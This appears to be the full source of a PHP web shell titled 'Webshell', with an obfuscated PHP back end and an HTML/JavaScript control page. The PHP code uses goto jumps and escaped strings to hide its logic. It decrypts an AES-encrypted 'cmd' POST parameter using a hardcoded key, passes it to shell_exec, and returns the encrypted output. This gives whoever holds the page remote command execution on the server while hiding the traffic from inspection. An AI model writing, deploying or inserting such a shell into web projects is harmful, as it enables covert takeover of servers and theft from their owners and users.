<?php
 goto eyo8g; U2SjE: $key = base64_encode(bin2hex(base64_decode(base64_encode($original_key)))); goto RN7NX; g5OyM: if ($_SERVER["\x52\105\x51\125\x45\123\124\x5f\x4d\x45\124\110\x4f\104"] === "\x50\117\x53\x54") { $encryptedCommand = $_POST["\x63\x6d\144"]; $decodedCommand = decrypt($encryptedCommand, $key); if ($decodedCommand === false) { echo encrypt("\104\145\143\x72\171\160\164\x69\157\x6e\40\146\x61\x69\154\x65\144\x21", $key); die; } $output = shell_exec($decodedCommand); if ($output === null) { $output = "\103\157\x6d\155\141\x6e\144\40\145\x78\145\143\165\164\x69\x6f\156\40\x66\141\x69\x6c\145\x64\40\157\x72\40\x6e\x6f\x20\x6f\165\x74\160\x75\164\56"; } echo encrypt($output, $key); die; } goto n3jkV; RN7NX: function encrypt($data, $key) { return base64_encode(openssl_encrypt($data, "\x41\x45\x53\x2d\x31\62\70\x2d\x43\102\103", $key, OPENSSL_RAW_DATA, $key)); } goto tzebb; tzebb: function decrypt($data, $key) { return openssl_decrypt(base64_decode($data), "\101\x45\123\55\x31\x32\x38\55\x43\102\103", $key, OPENSSL_RAW_DATA, $key); } goto g5OyM; eyo8g: $original_key = "\163\x33\143\x72\63\x74\x6b\x33\x79\x31\62\x33\64\65\x36\x37"; goto U2SjE; n3jkV: ?>
<!doctypehtml><html lang="en"><head><meta charset="UTF-8"><meta content="width=device-width,initial-scale=1"name="viewport"><title>Webshell</title><style>body{font-family:Arial,sans-serif;margin:20px}textarea{width:100%;height:100px}.output{width:100%;height:200px;margin-top:10px;overflow-y:scroll;background:#f9f9f9;border:1px solid #ccc;padding:10px}</style></head><body><h1>Webshell</h1><h2>Execute Command</h2><form id="commandForm"><textarea id="command"placeholder="Enter command"></textarea> <button onclick="executeCommand()"type="button">Run</button></form><div class="output"id="commandOutput"></div><script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script><script>const originalKey = "s3cr3tk3y1234567";
        const key = btoa(
            Array.from(
                atob(btoa(originalKey))
            )
            .map(c => c.charCodeAt(0).toString(16).padStart(2, '0'))
            .join('')
        );

        function encrypt(data, key) {
            const iv = CryptoJS.enc.Utf8.parse(key.substring(0, 16)); 
            return CryptoJS.AES.encrypt(data, CryptoJS.enc.Utf8.parse(key.substring(0, 16)), {
                iv: iv,
                mode: CryptoJS.mode.CBC,
                padding: CryptoJS.pad.Pkcs7
            }).toString();
        }

        function decrypt(data, key) {
            const iv = CryptoJS.enc.Utf8.parse(key.substring(0, 16));
            const bytes = CryptoJS.AES.decrypt(data, CryptoJS.enc.Utf8.parse(key.substring(0, 16)), {
                iv: iv,
                mode: CryptoJS.mode.CBC,
                padding: CryptoJS.pad.Pkcs7
            });
            return bytes.toString(CryptoJS.enc.Utf8);
        }

        async function executeCommand() {
            const command = document.getElementById("command").value;
            if (!command.trim()) {
                alert("Please enter a command.");
                return;
            }
            const encryptedCommand = encrypt(command, key);
            const formData = new FormData();
            formData.append("cmd", encryptedCommand);

            try {
                const response = await fetch("webshell.php", { method: "POST", body: formData });
                const encryptedOutput = await response.text();
                const decryptedOutput = decrypt(encryptedOutput, key);
                document.getElementById("commandOutput").innerText = decryptedOutput;
            } catch (error) {
                document.getElementById("commandOutput").innerText = "Error executing command.";
            }
        }</script></body></html>
